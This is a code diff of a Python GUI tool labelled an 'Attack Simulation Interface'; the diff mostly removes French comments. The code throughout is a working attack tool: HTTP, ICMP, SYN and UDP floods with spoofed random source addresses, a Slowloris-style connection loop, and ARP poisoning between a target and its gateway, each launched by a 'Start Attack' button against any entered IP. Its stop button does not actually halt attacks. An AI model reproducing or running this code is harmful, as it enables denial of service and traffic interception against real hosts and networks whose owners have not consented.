@@ -1,5 +1,5 @@
-import threading  # Importation de threading pour exécuter l'attaque dans un thread séparé
-import requests  # Pour l'attaque HTTP Flood
+import threading  
+import requests  
 from scapy.all import IP, ICMP, TCP, UDP, send, ARP, srp, Ether
 import random
 import time
@@ -8,30 +8,30 @@ import tkinter as tk
 from tkinter import messagebox
 import customtkinter as ctk
 
-# Fonction pour HTTP Flood Attack
+
 def http_flood(target_ip, target_port, count, log_display):
     http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
     for _ in range(count):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target_ip, target_port))  # Connexion au serveur
-            sock.send(http_request.encode())  # Envoi de la requête HTTP
+            sock.connect((target_ip, target_port))  
+            sock.send(http_request.encode())  
             log_display.insert(tk.END, f"HTTP Flood request sent to {target_ip}:{target_port}\n")
             sock.close()
         except Exception as e:
             log_display.insert(tk.END, f"Error during HTTP Flood: {e}\n")
 
-# Fonction pour ICMP Flood Attack
+
 def icmp_flood_attack(target_ip, packet_count, log_display):
     for _ in range(packet_count):
         ip_layer = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
         icmp_layer = ICMP()
-        payload = b"X" * random.randint(10, 50)  # Taille aléatoire du payload
+        payload = b"X" * random.randint(10, 50)  
         packet = ip_layer / icmp_layer / payload
         send(packet, verbose=0)
         log_display.insert(tk.END, f"ICMP packet sent to {target_ip}\n")
 
-# Fonction pour SYN Flood Attack
+
 def syn_flood_attack(target_ip, target_port, packet_count, log_display):
     for _ in range(packet_count):
         ip_layer = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
@@ -40,19 +40,18 @@ def syn_flood_attack(target_ip, target_port, packet_count, log_display):
         send(packet, verbose=0)
         log_display.insert(tk.END, f"SYN packet sent to {target_ip}:{target_port}\n")
 
-# Fonction pour UDP Flood Attack
 def udp_flood_attack(target_ip, target_port, packet_count, log_display):
     for _ in range(packet_count):
         ip_layer = IP(src=".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
         udp_layer = UDP(sport=random.randint(1024, 65535), dport=target_port)
-        payload = b"X" * random.randint(10, 50)  # Taille aléatoire du payload
+        payload = b"X" * random.randint(10, 50)  
         packet = ip_layer / udp_layer / payload
         send(packet, verbose=0)
         log_display.insert(tk.END, f"UDP packet sent to {target_ip}:{target_port}\n")
 
-# Fonction pour Anonymous Attack (Slowloris)
+
 def slowloris_attack(target_ip, target_port, log_display):
-    url = f"http://{target_ip}:{target_port}"  # Construire l'URL cible
+    url = f"http://{target_ip}:{target_port}"  
     while True:
         try:
             headers = {'Connection': 'keep-alive'}
@@ -62,7 +61,7 @@ def slowloris_attack(target_ip, target_port, log_display):
             log_display.insert(tk.END, f"Error occurred: {e}\n")
         time.sleep(0.1)
 
-# Fonction pour ARP Poisoning Attack
+
 def arp_poisoning_attack(target_ip, gateway_ip, log_display):
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
@@ -80,7 +79,7 @@ def arp_poisoning_attack(target_ip, gateway_ip, log_display):
         log_display.insert(tk.END, f"ARP poisoning packets sent to {target_ip} and {gateway_ip}\n")
         time.sleep(2)
 
-# Fonction pour obtenir l'adresse MAC d'une cible IP
+
 def get_mac(ip):
     try:
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
@@ -90,7 +89,7 @@ def get_mac(ip):
         print(f"Error getting MAC for {ip}: {e}")
         return None
 
-# Fonction pour démarrer l'attaque dans un thread séparé
+
 def start_attack_thread():
     attack_type = attack_menu.get()
     ip = ip_entry.get()
@@ -128,17 +127,17 @@ def start_attack_thread():
 
     messagebox.showinfo("Information", f"{attack_type} attack started on {ip}:{port}")
 
-# Fonction pour arrêter l'attaque
+
 def stop_attack():
     log_display.insert(tk.END, "Attack stopped.\n")
-    # Ajouter la logique pour arrêter l'attaque ici si nécessaire
 
-# Création de la fenêtre principale
+
+
 app = ctk.CTk()
 app.title("Attack Simulation Interface")
 app.geometry("600x600")
 
-# Menu pour sélectionner le type d'attaque
+
 attack_label = ctk.CTkLabel(app, text="Select Attack Type:")
 attack_label.pack(pady=10)
 
@@ -146,7 +145,7 @@ attack_types = ["HTTP Flood", "ICMP Flood", "SYN Flood", "UDP Flood", "Anonymous
 attack_menu = ctk.CTkComboBox(app, values=attack_types)
 attack_menu.pack(pady=10)
 
-# Champs de configuration (IP, port, packets, gateway)
+
 config_frame = ctk.CTkFrame(app)
 config_frame.pack(pady=10, padx=20)
 
@@ -170,19 +169,17 @@ gateway_label.grid(row=3, column=0, padx=5, pady=5)
 gateway_entry = ctk.CTkEntry(config_frame)
 gateway_entry.grid(row=3, column=1, padx=5, pady=5)
 
-# Boutons pour démarrer et arrêter l'attaque
+
 button_frame = ctk.CTkFrame(app)
 button_frame.pack(pady=10)
 
-start_button = ctk.CTkButton(button_frame, text="Start Attack", command=start_attack_thread)  # Appel de la fonction avec threading
+start_button = ctk.CTkButton(button_frame, text="Start Attack", command=start_attack_thread)  
 start_button.pack(side=tk.LEFT, padx=10)
 
 stop_button = ctk.CTkButton(button_frame, text="Stop Attack", command=stop_attack)
 stop_button.pack(side=tk.LEFT, padx=10)
 
-# Zone de log pour afficher les messages
 log_display = tk.Text(app, height=10, width=50)
 log_display.pack(pady=10)
 
-# Lancer l'application
 app.mainloop()
